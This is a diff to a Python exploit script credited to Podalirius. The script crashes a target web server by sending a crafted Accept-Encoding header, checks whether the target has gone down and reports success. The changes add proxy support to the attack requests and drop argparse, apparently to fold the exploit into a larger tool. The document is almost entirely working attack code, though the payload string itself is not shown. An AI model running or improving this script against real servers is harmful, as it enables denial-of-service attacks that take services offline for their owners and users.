@@ -4,18 +4,20 @@
 # Author             : Podalirius (@podalirius_)
 # Date created       : 13 Jan 2022
 
-import argparse
 import datetime
 import requests
 import time
 import threading
-
+proxy=None
+def set_agent(p):#设置代理
+    global proxy
+    proxy=p
 class exp:
     def monitor_thread(self,target, dtime=5):
         print(f'[>] Started monitoring of target server for the next {dtime} seconds.')
         for k in range(dtime):
             try:
-                r = requests.get(target, timeout=1)
+                r = requests.get(target, proxies=proxy,timeout=1)
             except (requests.exceptions.ReadTimeout, requests.exceptions.ConnectTimeout) as e:
                 print("   [%s] \x1b[1;91mTarget is down!\x1b[0m" % datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
             else:
@@ -38,7 +40,7 @@ class exp:
         # Sending payload
         print("   [+] Sending payload ...")
         try:
-            r = requests.get(target, headers={"Accept-Encoding": payload}, timeout=15)
+            r = requests.get(target, proxies=proxy,headers={"Accept-Encoding": payload}, timeout=15)
         except (requests.exceptions.ReadTimeout, requests.exceptions.ConnectTimeout) as e:
             t.join()
             print("[%s] \x1b[1;91mTarget successfully crashed!\x1b[0m" % datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
